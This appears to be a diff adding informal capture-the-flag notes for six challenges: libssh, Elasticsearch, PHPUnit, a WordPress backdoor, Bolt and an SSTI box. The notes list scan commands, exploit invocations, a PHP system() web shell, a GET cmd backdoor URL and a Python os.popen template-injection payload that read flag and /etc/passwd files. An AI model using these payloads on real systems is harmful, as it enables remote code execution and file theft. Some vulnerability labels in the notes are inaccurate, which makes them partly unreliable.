@@ -1,0 +1,45 @@
+///LIBSSH///
+/nmap -sV -sC -p 30463 35.198.135.192 -Pn
+Firstly using nmap for port scanning 
+/searchsploit libssh
+We use searchsploit to find vulnerability for libssh
+When we found the vulnerability we are going to use it to get ctf.
+we will use command:
+/python libssh.py 35.198.135.192 -p 30463 -c "cd ..; cat  flag.txt"
+vulnerability is libssh vulnerability
+///elastic///
+When we entered the site we can the version which will be useful to find the vulnerability called the version of elasticsearch.
+now we are gonna use command searchsploit to find the vulnerability we are searching for. The command is:
+/searchsploit elasticsearch
+we can see the version that we are searching for. we need directory traversal. now te are going to download it. and we are going to use the vulnerability to gec the ctf. command is: 
+/python exploit.py http://link /etc/passwd
+elastic search has vulnerability called directory traversal that helps attackers to get arbitrary files.
+///php-unit///
+when we enter the site. there is nothing to do. lets btuteforce the directories using dirsearch. we use command:
+dirsearch -u(for url) and ip address. it gave us several directories. we used composer.json to find version, and vulnerable file is /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.ph. when we entered /composer.json, from here we can find that this version is vulnerable. now we need to add vulnerable file to our ip and then send to repeater. we add <?php system('cat /flag.txt')?> to get the flag
+vulnerability is path traversal.
+///nodiff//
+When we entered the site, this is default wordpress website. we use dirsearch to find directories. here we can see backup.zip file. 
+using command 
+/wget http://link/backup.zip to save it. then we get into backup directory by extracting it. using command
+/grep -r "shell_exec(" we see files, and we say vulnerable file, which is /functions.php. using vim we opened this file and saw taht if "welldone"="knockknock" it will excecute the parameter.
+then we will modify the link http://link/?welldone=knockknock&shazam=id to get the id. then http://link/?welldone=knockknock&shazam=cat flag.php
+backdoor vulnerability.
+///bolt///
+<?php echo system($_GET['cmd']);?>
+
+http://35.198.135.192:30881/files/bolt.php?cmd=ls%20-l
+
+http://35.198.135.192:30881/files/bolt.php?cmd=cat%20/flag.txt
+
+path traversal vulnerability
+///shark///
+curl -I url   from here we will get that it is vulnerable to ssti and is based on python sever located in Werkzeug.
+${7*7}
+we should go tu burpsuite. submit anything. and than we add to name=<%
+import os
+x=os.popen("cat flag").read()
+%>
+${x}
+vulnerability is server site template injection, shortly ssti.
+
